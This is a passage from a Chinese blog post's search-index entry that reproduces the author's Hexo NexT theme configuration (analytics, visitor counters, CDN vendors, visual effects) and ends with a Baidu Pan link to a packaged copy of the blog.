class="line"></span><br><span class="line"># Google Analytics</span><br><span class="line">google_analytics: </span><br><span class="line"></span><br><span class="line"># https:&#x2F;&#x2F;liaofuzhan.netlify.com 站点验证</span><br><span class="line">baidu_site_verification: OTG88475E6</span><br><span class="line"></span><br><span class="line">qihu_site_verification: </span><br><span class="line"></span><br><span class="line">sogou_site_verification: </span><br><span class="line"></span><br><span class="line"># Bing Webmaster tools verification setting</span><br><span class="line"># See: https:&#x2F;&#x2F;www.bing.com&#x2F;webmaster&#x2F;</span><br><span class="line">bing_site_verification: </span><br><span class="line"></span><br><span class="line"># Yandex Webmaster tools verification setting</span><br><span class="line"># See: https:&#x2F;&#x2F;webmaster.yandex.ru&#x2F;</span><br><span class="line">#yandex_site_verification:</span><br><span class="line"></span><br><span class="line"># CNZZ count</span><br><span class="line">#cnzz_siteid:</span><br><span class="line"></span><br><span class="line"># Application Insights</span><br><span class="line"># See https:&#x2F;&#x2F;azure.microsoft.com&#x2F;en-us&#x2F;services&#x2F;application-insights&#x2F;</span><br><span class="line"># application_insights:</span><br><span class="line"></span><br><span class="line"># Make duoshuo show UA</span><br><span class="line"># user_id must NOT be null when admin_enable is true!</span><br><span class="line"># you can visit http:&#x2F;&#x2F;dev.duoshuo.com get duoshuo user id.</span><br><span class="line">duoshuo_info:</span><br><span class="line">  ua_enable: true</span><br><span class="line">  admin_enable: false</span><br><span class="line">  user_id: 0</span><br><span class="line">  #admin_nickname: Author</span><br><span class="line"></span><br><span class="line"># Post widgets &amp; FB&#x2F;VK comments settings.</span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"># Facebook SDK Support.</span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;iissnan&#x2F;hexo-theme-next&#x2F;pull&#x2F;410</span><br><span class="line">facebook_sdk:</span><br><span class="line">  enable:       false</span><br><span class="line">  app_id:       #&lt;app_id&gt;</span><br><span class="line">  fb_admin:     #&lt;user_id&gt;</span><br><span class="line">  like_button:  #true</span><br><span class="line">  webmaster:    #true</span><br><span class="line"></span><br><span class="line"># Facebook comments plugin</span><br><span class="line"># This plugin depends on Facebook SDK.</span><br><span class="line"># If facebook_sdk.enable is false, Facebook comments plugin is unavailable.</span><br><span class="line">facebook_comments_plugin:</span><br><span class="line">  enable:       false</span><br><span class="line">  num_of_posts: 10    # min posts num is 1</span><br><span class="line">  width:        100%  # default width is 550px</span><br><span class="line">  scheme:       light # default scheme is light (light or dark)</span><br><span class="line"></span><br><span class="line"># VKontakte API Support.</span><br><span class="line"># To get your AppID visit https:&#x2F;&#x2F;vk.com&#x2F;editapp?act&#x3D;create</span><br><span class="line">vkontakte_api:</span><br><span class="line">  enable:       false</span><br><span class="line">  app_id:       #&lt;app_id&gt;</span><br><span class="line">  like:         true</span><br><span class="line">  comments:     true</span><br><span class="line">  num_of_posts: 10</span><br><span class="line"></span><br><span class="line"># 文章评分功能</span><br><span class="line"># Star rating support to each article.</span><br><span class="line"># To get your ID visit https:&#x2F;&#x2F;widgetpack.com</span><br><span class="line">rating:</span><br><span class="line">  enable: false</span><br><span class="line">  id:     #&lt;app_id&gt;</span><br><span class="line">  color: </span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># Show number of visitors to each article.</span><br><span class="line"># You can visit https:&#x2F;&#x2F;leancloud.cn get AppID and AppKey.</span><br><span class="line"># 安全问题：https:&#x2F;&#x2F;leaferx.online&#x2F;2018&#x2F;02&#x2F;11&#x2F;lc-security&#x2F;</span><br><span class="line">leancloud_visitors:</span><br><span class="line">  enable: true</span><br><span class="line">  app_id: HzU5gDhBUYHF8QTF8DmbGhjD-gzGzoHsz #&lt;app_id&gt;</span><br><span class="line">  app_key: wp1HNJ17SdpnE0wIFq99eTKH #&lt;app_key&gt;</span><br><span class="line">  # Dependencies: https:&#x2F;&#x2F;github.com&#x2F;theme-next&#x2F;hexo-leancloud-counter-security</span><br><span class="line">  # If you don&#39;t care about security in leancloud counter and just want to use it directly</span><br><span class="line">  # (without hexo-leancloud-counter-security plugin), set &#96;security&#96; to &#96;false&#96;.</span><br><span class="line">  security: false</span><br><span class="line">  betterPerformance: true</span><br><span class="line"></span><br><span class="line"># Another tool to show number of visitors to each article.</span><br><span class="line"># visit https:&#x2F;&#x2F;console.firebase.google.com&#x2F;u&#x2F;0&#x2F; to get apiKey and projectId</span><br><span class="line"># visit https:&#x2F;&#x2F;firebase.google.com&#x2F;docs&#x2F;firestore&#x2F; to get more information about firestore</span><br><span class="line">firestore:</span><br><span class="line">  enable: false</span><br><span class="line">  collection: XXXXXXXX #required, a string collection name to access firestore database</span><br><span class="line">  apiKey: XXXXXXXX #required</span><br><span class="line">  projectId: XXXXXXXX #required</span><br><span class="line">  bluebird: false #enable this if you want to include bluebird 3.5.1(core version) Promise polyfill</span><br><span class="line"></span><br><span class="line"># Show PV&#x2F;UV of the website&#x2F;page with busuanzi.</span><br><span class="line"># Get more information on http:&#x2F;&#x2F;ibruce.info&#x2F;2015&#x2F;04&#x2F;04&#x2F;busuanzi&#x2F;</span><br><span class="line">busuanzi_count:</span><br><span class="line">  # count values only if the other configs are false</span><br><span class="line">  enable: true</span><br><span class="line">  # custom uv span for the whole site</span><br><span class="line">  site_uv: true</span><br><span class="line">#  site_uv_header: &lt;i class&#x3D;&quot;fa fa-user&quot;&gt;&lt;&#x2F;i&gt; 访客</span><br><span class="line">  site_uv_header: &lt;i class&#x3D;&quot;fa fa-user&quot;&gt;&lt;&#x2F;i&gt;</span><br><span class="line">  site_uv_footer:</span><br><span class="line">  # custom pv span for the whole site</span><br><span class="line">  site_pv: true</span><br><span class="line">#  site_pv_header: &lt;i class&#x3D;&quot;fa fa-eye&quot;&gt;&lt;&#x2F;i&gt; 访问量</span><br><span class="line">  site_pv_header: &lt;i class&#x3D;&quot;fa fa-eye&quot;&gt;&lt;&#x2F;i&gt;</span><br><span class="line">  site_pv_footer:</span><br><span class="line">  # custom pv span for one page only</span><br><span class="line">  page_pv: false #使用leancloud(firestore)统计pv及排行</span><br><span class="line">  page_pv_header: &lt;i class&#x3D;&quot;fa fa-file-o&quot;&gt;&lt;&#x2F;i&gt; 浏览</span><br><span class="line">  page_pv_footer: 次</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Tencent analytics ID</span><br><span class="line"># tencent_analytics:</span><br><span class="line"></span><br><span class="line"># Tencent MTA ID</span><br><span class="line"># tencent_mta:</span><br><span class="line"></span><br><span class="line"># Enable baidu push so that the blog will push the url to baidu automatically which is very helpful for SEO</span><br><span class="line">baidu_push: true</span><br><span class="line"></span><br><span class="line"># Google Calendar</span><br><span class="line"># Share your recent schedule to others via calendar page</span><br><span class="line">#</span><br><span class="line"># API Documentation:</span><br><span class="line"># https:&#x2F;&#x2F;developers.google.com&#x2F;google-apps&#x2F;calendar&#x2F;v3&#x2F;reference&#x2F;events&#x2F;list</span><br><span class="line">calendar:</span><br><span class="line">  enable: false</span><br><span class="line">  calendar_id: &lt;required&gt;</span><br><span class="line">  api_key: &lt;required&gt;</span><br><span class="line">  orderBy: startTime</span><br><span class="line">  offsetMax: 24</span><br><span class="line">  offsetMin: 4</span><br><span class="line">  timeZone:</span><br><span class="line">  showDeleted: false</span><br><span class="line">  singleEvents: true</span><br><span class="line">  maxResults: 250</span><br><span class="line"></span><br><span class="line"># Algolia Search</span><br><span class="line">algolia_search:</span><br><span class="line">  enable: false</span><br><span class="line">  hits:</span><br><span class="line">    per_page: 10</span><br><span class="line">  labels:</span><br><span class="line">    input_placeholder: Search for Posts</span><br><span class="line">    hits_empty: &quot;We didn&#39;t find any results for the search: $&#123;query&#125;&quot;</span><br><span class="line">    hits_stats: &quot;$&#123;hits&#125; results found in $&#123;time&#125; ms&quot;</span><br><span class="line"></span><br><span class="line"># Local search</span><br><span class="line"># Dependencies: https:&#x2F;&#x2F;github.com&#x2F;flashlab&#x2F;hexo-generator-search</span><br><span class="line">local_search:</span><br><span class="line">  enable: true</span><br><span class="line">  # if auto, trigger search by changing input</span><br><span class="line">  # if manual, trigger search by pressing enter key or search button</span><br><span class="line">  trigger: auto</span><br><span class="line">  # show top n results per article, show all results by setting to -1</span><br><span class="line">  top_n_per_article: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"># Tags Settings</span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># External URL with BASE64 encrypt &amp; decrypt.</span><br><span class="line"># Usage: &#123;% exturl text url &quot;title&quot; %&#125;</span><br><span class="line"># Alias: &#123;% extlink text url &quot;title&quot; %&#125;</span><br><span class="line">exturl: false</span><br><span class="line"></span><br><span class="line"># Note tag (bs-callout).</span><br><span class="line"># 标注 https:&#x2F;&#x2F;theme-next.org&#x2F;docs&#x2F;tag-plugins&#x2F;note</span><br><span class="line">note:</span><br><span class="line">  # Note tag style values:</span><br><span class="line">  #  - simple    bs-callout old alert style. Default.</span><br><span class="line">  #  - modern    bs-callout new (v2-v3) alert style.</span><br><span class="line">  #  - flat      flat callout style with background, like on Mozilla or StackOverflow.</span><br><span class="line">  #  - disabled  disable all CSS styles import of note tag.</span><br><span class="line">  style: flat</span><br><span class="line">  icons: true</span><br><span class="line">  border_radius: 3</span><br><span class="line">  # Offset lighter of background in % for modern and flat styles (modern: -12 | 12; flat: -18 | 6).</span><br><span class="line">  # Offset also applied to label tag variables. This option can work with disabled note tag.</span><br><span class="line">  light_bg_offset: 0</span><br><span class="line"></span><br><span class="line"># Label tag.</span><br><span class="line">label: true</span><br><span class="line"></span><br><span class="line"># Tabs tag.</span><br><span class="line">tabs:</span><br><span class="line">  enable: true</span><br><span class="line">  transition:</span><br><span class="line">    tabs: false</span><br><span class="line">    labels: true</span><br><span class="line">  border_radius: 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#! ---------------------------------------------------------------</span><br><span class="line">#! DO NOT EDIT THE FOLLOWING SETTINGS</span><br><span class="line">#! UNLESS YOU KNOW WHAT YOU ARE DOING</span><br><span class="line">#! ---------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># Use velocity to animate everything.</span><br><span class="line">motion:</span><br><span class="line">  enable: true</span><br><span class="line">  async: true</span><br><span class="line">  transition:</span><br><span class="line">    # Transition variants:</span><br><span class="line">    # fadeIn | fadeOut | flipXIn | flipXOut | flipYIn | flipYOut | flipBounceXIn | flipBounceXOut | flipBounceYIn | flipBounceYOut</span><br><span class="line">    # swoopIn | swoopOut | whirlIn | whirlOut | shrinkIn | shrinkOut | expandIn | expandOut</span><br><span class="line">    # bounceIn | bounceOut | bounceUpIn | bounceUpOut | bounceDownIn | bounceDownOut | bounceLeftIn | bounceLeftOut | bounceRightIn | bounceRightOut</span><br><span class="line">    # slideUpIn | slideUpOut | slideDownIn | slideDownOut | slideLeftIn | slideLeftOut | slideRightIn | slideRightOut</span><br><span class="line">    # slideUpBigIn | slideUpBigOut | slideDownBigIn | slideDownBigOut | slideLeftBigIn | slideLeftBigOut | slideRightBigIn | slideRightBigOut</span><br><span class="line">    # perspectiveUpIn | perspectiveUpOut | perspectiveDownIn | perspectiveDownOut | perspectiveLeftIn | perspectiveLeftOut | perspectiveRightIn | perspectiveRightOut</span><br><span class="line">    post_block: flipYIn</span><br><span class="line">    post_header: perspectiveRightIn</span><br><span class="line">    post_body: perspectiveLeftIn</span><br><span class="line">    coll_header: swoopIn</span><br><span class="line">    # Only for Pisces | Gemini.</span><br><span class="line">    sidebar: shrinkIn</span><br><span class="line"></span><br><span class="line"># Fancybox</span><br><span class="line">fancybox: true</span><br><span class="line"></span><br><span class="line"># Progress bar in the top during page loading.</span><br><span class="line">pace: true</span><br><span class="line"># Themes list:</span><br><span class="line">#pace-theme-big-counter</span><br><span class="line">#pace-theme-bounce</span><br><span class="line">#pace-theme-barber-shop</span><br><span class="line">#pace-theme-center-atom</span><br><span class="line">#pace-theme-center-circle</span><br><span class="line">#pace-theme-center-radar</span><br><span class="line">#pace-theme-center-simple</span><br><span class="line">#pace-theme-corner-indicator</span><br><span class="line">#pace-theme-fill-left</span><br><span class="line">#pace-theme-flash</span><br><span class="line">#pace-theme-loading-bar</span><br><span class="line">#pace-theme-mac-osx</span><br><span class="line">#pace-theme-minimal</span><br><span class="line"># For example</span><br><span class="line"># pace_theme: pace-theme-center-simple</span><br><span class="line">pace_theme: pace-theme-minimal</span><br><span class="line"></span><br><span class="line"># canves系列：设置背景波浪、线条</span><br><span class="line"># Canvas-nest</span><br><span class="line">canvas_nest: false</span><br><span class="line"></span><br><span class="line"># three_waves</span><br><span class="line">three_waves: false</span><br><span class="line"></span><br><span class="line"># canvas_lines</span><br><span class="line">canvas_lines: false</span><br><span class="line"></span><br><span class="line"># canvas_sphere</span><br><span class="line">canvas_sphere: false</span><br><span class="line"></span><br><span class="line"># Only fit scheme Pisces</span><br><span class="line"># Canvas-ribbon</span><br><span class="line"># size: The width of the ribbon.</span><br><span class="line"># alpha: The transparency of the ribbon.</span><br><span class="line"># zIndex: The display level of the ribbon.</span><br><span class="line"># 条状背景线，点击动态变化</span><br><span class="line">canvas_ribbon:</span><br><span class="line">  enable: true</span><br><span class="line">  size: 60</span><br><span class="line">  alpha: 0.1</span><br><span class="line">  zIndex: -1</span><br><span class="line"></span><br><span class="line"># 设置CDN加速：http:&#x2F;&#x2F;yearito.cn&#x2F;posts&#x2F;hexo-deploy-to-VPS.html</span><br><span class="line"># Script Vendors.</span><br><span class="line"># Set a CDN address for the vendor you want to customize.</span><br><span class="line"># For example</span><br><span class="line">#    jquery: https:&#x2F;&#x2F;ajax.googleapis.com&#x2F;ajax&#x2F;libs&#x2F;jquery&#x2F;2.2.0&#x2F;jquery.min.js</span><br><span class="line"># Be aware that you should use the same version as internal ones to avoid potential problems.</span><br><span class="line"># Please use the https protocol of CDN files when you enable https on your site.</span><br><span class="line">vendors:</span><br><span class="line">  # Internal path prefix. Please do not edit it.</span><br><span class="line">  _internal: lib</span><br><span class="line"></span><br><span class="line">  # Internal version: 2.1.3</span><br><span class="line">  jquery: &#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;jquery@2.1.3&#x2F;dist&#x2F;jquery.min.js</span><br><span class="line"></span><br><span class="line">  # Internal version: 2.1.5</span><br><span class="line">  # See: http:&#x2F;&#x2F;fancyapps.com&#x2F;fancybox&#x2F;</span><br><span class="line">#  图片左右切换按钮</span><br><span class="line">#  fancybox: #https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;@fancyapps&#x2F;fancybox@3.5.2&#x2F;dist&#x2F;jquery.fancybox.min.js</span><br><span class="line">#  fancybox_css: #https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;@fancyapps&#x2F;fancybox@3.5.2&#x2F;dist&#x2F;jquery.fancybox.min.css</span><br><span class="line">  fancybox:</span><br><span class="line">  fancybox_css:</span><br><span class="line"></span><br><span class="line">  # Internal version: 1.0.6</span><br><span class="line">  # See: https:&#x2F;&#x2F;github.com&#x2F;ftlabs&#x2F;fastclick</span><br><span class="line">  fastclick: &#x2F;&#x2F;cdn.jsdelivr.net&#x2F;fastclick&#x2F;1.0.6&#x2F;fastclick.min.js</span><br><span class="line"></span><br><span class="line">  # Internal version: 1.9.7</span><br><span class="line">  # See: https:&#x2F;&#x2F;github.com&#x2F;tuupola&#x2F;jquery_lazyload</span><br><span class="line">  lazyload: &#x2F;&#x2F;cdn.jsdelivr.net&#x2F;jquery.lazyload&#x2F;1.9.3&#x2F;jquery.lazyload.min.js</span><br><span class="line"></span><br><span class="line">  # Internal version: 1.2.1</span><br><span class="line">  # See: http:&#x2F;&#x2F;VelocityJS.org</span><br><span class="line">  velocity: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;velocity-animate@1.2.1&#x2F;velocity.min.js</span><br><span class="line"></span><br><span class="line">  # Internal version: 1.2.1</span><br><span class="line">  # See: http:&#x2F;&#x2F;VelocityJS.org</span><br><span class="line">  velocity_ui: &#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;velocity-animate@1.2.1&#x2F;velocity.ui.min.js</span><br><span class="line"></span><br><span class="line">  # Internal version: 0.7.9</span><br><span class="line">  # See: https:&#x2F;&#x2F;faisalman.github.io&#x2F;ua-parser-js&#x2F;</span><br><span class="line">  ua_parser: &#x2F;&#x2F;cdn.jsdelivr.net&#x2F;ua-parser.js&#x2F;0.7.10&#x2F;ua-parser.min.js</span><br><span class="line"></span><br><span class="line">  # Internal version: 4.6.2</span><br><span class="line">  # See: http:&#x2F;&#x2F;fontawesome.io&#x2F;</span><br><span class="line">  fontawesome: &#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;font-awesome@4.7.0&#x2F;css&#x2F;font-awesome.min.css</span><br><span class="line"></span><br><span class="line">  # Internal version: 1</span><br><span class="line">  # https:&#x2F;&#x2F;www.algolia.com</span><br><span class="line">  algolia_instant_js: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;instantsearch.js@2.4.1&#x2F;dist&#x2F;instantsearch.js</span><br><span class="line">  algolia_instant_css: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;instantsearch.js@2.4.1&#x2F;dist&#x2F;instantsearch.min.css</span><br><span class="line"></span><br><span class="line">  # Internal version: 1.0.2</span><br><span class="line">  # See: https:&#x2F;&#x2F;github.com&#x2F;HubSpot&#x2F;pace</span><br><span class="line">  # Or use direct links below:</span><br><span class="line">  # pace: &#x2F;&#x2F;cdn.bootcss.com&#x2F;pace&#x2F;1.0.2&#x2F;pace.min.js</span><br><span class="line">  # pace_css: &#x2F;&#x2F;cdn.bootcss.com&#x2F;pace&#x2F;1.0.2&#x2F;themes&#x2F;blue&#x2F;pace-theme-flash.min.css</span><br><span class="line">  pace: &#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;pace-js@1.0.2&#x2F;pace.min.js</span><br><span class="line">  pace_css: &#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;pace-js@1.0.2&#x2F;themes&#x2F;blue&#x2F;pace-theme-minimal.css</span><br><span class="line"></span><br><span class="line">  pangu: &#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;pangu@3.3.0&#x2F;dist&#x2F;browser&#x2F;pangu.min.js</span><br><span class="line"></span><br><span class="line">  valine: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;valine@1.3.3&#x2F;dist&#x2F;Valine.min.js</span><br><span class="line"></span><br><span class="line">  # Internal version: 1.0.0</span><br><span class="line">  # https:&#x2F;&#x2F;github.com&#x2F;hustcc&#x2F;canvas-nest.js</span><br><span class="line">  canvas_nest: &#x2F;&#x2F;cdn.bootcss.com&#x2F;canvas-nest.js&#x2F;1.0.1&#x2F;canvas-nest.min.js</span><br><span class="line"></span><br><span class="line">  # three</span><br><span class="line">  three:</span><br><span class="line"></span><br><span class="line">  # three_waves</span><br><span class="line">  # https:&#x2F;&#x2F;github.com&#x2F;jjandxa&#x2F;three_waves</span><br><span class="line">  three_waves:</span><br><span class="line"></span><br><span class="line">  # three_waves</span><br><span class="line">  # https:&#x2F;&#x2F;github.com&#x2F;jjandxa&#x2F;canvas_lines</span><br><span class="line">  canvas_lines:</span><br><span class="line"></span><br><span class="line">  # three_waves</span><br><span class="line">  # https:&#x2F;&#x2F;github.com&#x2F;jjandxa&#x2F;canvas_sphere</span><br><span class="line">  canvas_sphere:</span><br><span class="line"></span><br><span class="line">  # Internal version: 1.0.0</span><br><span class="line">  # https:&#x2F;&#x2F;github.com&#x2F;zproo&#x2F;canvas-ribbon</span><br><span class="line">  canvas_ribbon:</span><br><span class="line"></span><br><span class="line">  # Internal version: 3.3.0</span><br><span class="line">  # https:&#x2F;&#x2F;github.com&#x2F;ethantw&#x2F;Han</span><br><span class="line">  han:</span><br><span class="line"></span><br><span class="line">  # needMoreShare2</span><br><span class="line">  # https:&#x2F;&#x2F;github.com&#x2F;revir&#x2F;need-more-share2</span><br><span class="line">  needMoreShare2:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Assets</span><br><span class="line">css: css</span><br><span class="line">js: js</span><br><span class="line">images: images</span><br><span class="line"></span><br><span class="line"># Theme version</span><br><span class="line">version: 5.1.4</span><br><span class="line"></span><br><span class="line"># 文章末尾添加“本文结束”标记</span><br><span class="line">passage_end_tag:</span><br><span class="line">  enabled: true</span><br><span class="line"></span><br><span class="line"># 鼠标点击特效</span><br><span class="line">cursor_effect:</span><br><span class="line">  enabled: true</span><br><span class="line">  # fireworks：礼花 | explosion：爆炸 | love：浮出爱心 | text：浮出文字</span><br><span class="line">  type: explosion</span><br><span class="line"></span><br><span class="line"># typing effect 打字特效</span><br><span class="line">typing_effect:</span><br><span class="line">  enabled: true</span><br><span class="line">  colorful: true  # 礼花特效</span><br><span class="line">  shake: false  # 震动特效</span><br><span class="line"></span><br><span class="line"># 标签页样式 &#x2F;tags&#x2F;</span><br><span class="line"># type: | tagcanvas | color | love | bubble |</span><br><span class="line"># PS：tagcanvas依赖hexo-tag-cloud插件</span><br><span class="line">tagcloud:</span><br><span class="line">  type: bubble # 为空则使用默认标签页</span><br><span class="line"></span><br><span class="line"># 分类页样式</span><br><span class="line"># type: | love | bubble |</span><br><span class="line">category_style:</span><br><span class="line">  type: love # 为空则使用默认标签页</span><br><span class="line"></span><br><span class="line"># 侧栏自定义时间</span><br><span class="line">diy_time:</span><br><span class="line">  runtime:</span><br><span class="line">    enable: true#运行时间</span><br><span class="line">    birthday: &quot;07&#x2F;02&#x2F;2020 10:00:00&quot;</span><br><span class="line">  clock:</span><br><span class="line">    enable: true # 粒子时钟</span><br><span class="line"></span><br><span class="line"># 看板娘</span><br><span class="line">live2d:</span><br><span class="line">  enable: true</span><br><span class="line"></span><br><span class="line"># aplayer音乐播放器</span><br><span class="line">aplayer:</span><br><span class="line">  enable: false</span><br><span class="line"></span><br><span class="line"># https:&#x2F;&#x2F;player.lmih.cn&#x2F;</span><br><span class="line">haoyuePlayer:</span><br><span class="line">  enable: true</span><br><span class="line">  key: 159368326389</span><br><span class="line"></span><br><span class="line"># 网站右下角旋转魔方</span><br><span class="line">cube:</span><br><span class="line">  enable: true</span><br><span class="line">  type: mini # mini | hollow</span><br><span class="line"></span><br><span class="line"># Console 输出第三方个性化字体</span><br><span class="line">fig_font:</span><br><span class="line">  enable: true</span><br><span class="line">  font: Big Money-ne</span><br><span class="line">  input_text: Welcome To Leaface</span><br><span class="line"></span><br><span class="line"># Console 输出自定义字体</span><br><span class="line">diy_font:</span><br><span class="line">  enable: true</span><br><span class="line">  input_text: Welcome To Leaface</span><br><span class="line"></span><br><span class="line"># 谷歌广告</span><br><span class="line">google_ads:</span><br><span class="line">  enable: false</span><br><span class="line">  auto_ads: true # next&#x2F;layout&#x2F;_layout.swig、 _partials&#x2F;head.swig、文章内部</span><br><span class="line">  comments_ads: true # next&#x2F;layout&#x2F;_partials&#x2F;comments.swig</span><br><span class="line">  sidebar_ads: false # next&#x2F;layout&#x2F;_macro&#x2F;sidebar.swig</span><br><span class="line">  post_ads: false # next&#x2F;layout&#x2F;_macro&#x2F;post.swig</span><br><span class="line"></span><br><span class="line"># Online contact</span><br><span class="line">daovoice: false</span><br><span class="line">daovoice_app_id: XXXXXXXX</span><br><span class="line"></span><br><span class="line"># Tidio online chat</span><br><span class="line"># see: https:&#x2F;&#x2F;www.tidiochat.com</span><br><span class="line">tidio:</span><br><span class="line">  enable: true</span><br><span class="line">  key: XXXXXXXX # Public_Key</span><br><span class="line"></span><br><span class="line">pdf:</span><br><span class="line">  enable: true</span><br><span class="line">  # Default height</span><br><span class="line">  height: 500px</span><br><span class="line"></span><br><span class="line"># Hotjar页面反馈</span><br><span class="line"># see: https:&#x2F;&#x2F;www.hotjar.com&#x2F;</span><br><span class="line">hotjar:</span><br><span class="line">  enable: false</span><br><span class="line">  siteID: XXXXXXXX # site ID</span><br><span class="line"></span><br><span class="line"># 近期文章</span><br><span class="line">recent_posts_title: 近期文章</span><br><span class="line">recent_posts_layout: block</span><br><span class="line">recent_posts: true</span><br><span class="line"></span><br><span class="line">#  https:&#x2F;&#x2F;github.com&#x2F;overtrue&#x2F;share.js</span><br><span class="line">share_js: true</span><br><span class="line"></span><br><span class="line"># 网站底部订阅按钮</span><br><span class="line">web_subscribe:</span><br><span class="line">  enable: true</span><br><span class="line"></span><br><span class="line"># Dependencies: https:&#x2F;&#x2F;github.com&#x2F;tea3&#x2F;hexo-related-popular-posts</span><br><span class="line">related_posts:</span><br><span class="line">  enable: true</span><br><span class="line">  title: 相关文章</span><br><span class="line">  icon: graduation-cap</span><br><span class="line">  display_in_home: false</span><br><span class="line">  params:</span><br><span class="line">    maxCount: 10</span><br><span class="line">    #PPMixingRate: 0.0</span><br><span class="line">    #isDate: false</span><br><span class="line">    #isImage: false</span><br><span class="line">    #isExcerpt: false</span><br><span class="line"></span><br><span class="line"># 主页轮播图 使用 620x310 的图片</span><br><span class="line">#Home carousel map, from means link, img means picture</span><br><span class="line">carousel:</span><br><span class="line">  enable: True</span><br><span class="line">  item: [    &#123;</span><br><span class="line">      &#39;link&#39;: &#39;https:&#x2F;&#x2F;gylq.gitee.io&#x2F;2020&#x2F;07&#x2F;16&#x2F;2020-7-16&#x2F;&#39;,</span><br><span class="line">      &#39;img&#39;: &#39;https:&#x2F;&#x2F;s1.ax1x.com&#x2F;2020&#x2F;07&#x2F;16&#x2F;UB8doR.png&#39;</span><br><span class="line">    &#125;,</span><br><span class="line">  ]</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p><strong>图片有些眼花缭乱，一顿操作猛如虎，实际操作几分钟，授人以鱼不如授人以渔，但是我还是把鱼给你们吧。</strong></p>
<blockquote>
<p><strong><em>下面是我的博客的打包，可以让大家少安装一些依赖程序，少走度娘坑，有需要的自取，希望能帮助到大家。“使用方式”：就是直接覆盖你的博客文件夹就行了。</em></strong></p>
<p><a href="https://pan.baidu.com/s/1aMl-IeI5tJ_aw1F8YO2kNQ" target="_blank" rel="noopener">百度云盘</a></p>
<p>提取码：gylq</p>
</blockquote>
</blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>博客搭建</tag>
      </tags>
  </entry>
</search>
